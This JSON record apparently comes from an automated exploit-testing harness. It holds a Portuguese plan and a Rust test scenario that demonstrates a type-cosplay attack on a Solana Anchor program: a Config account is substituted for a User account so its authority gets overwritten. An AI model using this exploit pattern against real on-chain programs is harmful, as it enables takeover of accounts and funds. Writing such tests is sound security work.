{
  "plan": "O programa-alvo usa AccountInfo e desserializa manualmente um struct User com um booleano `discriminator` no inicio, sem validar o discriminador de 8 bytes do Anchor. O baseline chama `initialize` com uma conta cujos dados sao um User valido (discriminator=true) e uma authority signer, provando que o cenario esta correto. O ataque fornece uma conta de outro tipo (ex.: uma conta de configuracao com um booleano true no inicio) no lugar da conta User, mantendo a mesma authority signer. O efeito medido e que a conta de configuracao foi sobrescrita com a authority do atacante, demonstrando que o programa aceitou dados de outro tipo como User.",
  "scenario": "let authority = Pubkey::new_unique();
let user_key = Pubkey::new_unique();

// Conta User legitima: discriminador booleano true + authority inicial
let user_data = anchor_account_data("User", &(true, Pubkey::new_unique()));
let user_account = account(&env.program_id, &user_data, None);

let contas_baseline = vec![
    (user_key, user_account.clone()),
    (authority, wallet(1_000_000_000)),
];

let ix_baseline = env.anchor_ix("initialize", &(), vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(authority, true),
]);

let r_base = env.baseline("initialize legitimo com User valido", &ix_baseline, &contas_baseline);

// Conta de outro tipo (Config) com booleano true no inicio, para cosplay
let config_data = anchor_account_data("Config", &(true, Pubkey::new_unique()));
let config_account = account(&env.program_id, &config_data, None);

let contas_ataque = vec![
    (user_key, config_account),
    (authority, wallet(1_000_000_000)),
];

let ix_ataque = env.anchor_ix("initialize", &(), vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(authority, true),
]);

let r = env.attack("initialize com conta Config no lugar de User", &ix_ataque, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let dados = after(&r, &user_key).data();
    // O ataque sobrescreveu a authority da conta Config com a authority do atacante
    let authority_gravada = read_pubkey(dados, 1);
    env.effect("conta Config sobrescrita com authority do atacante", authority_gravada == authority);
}"
}

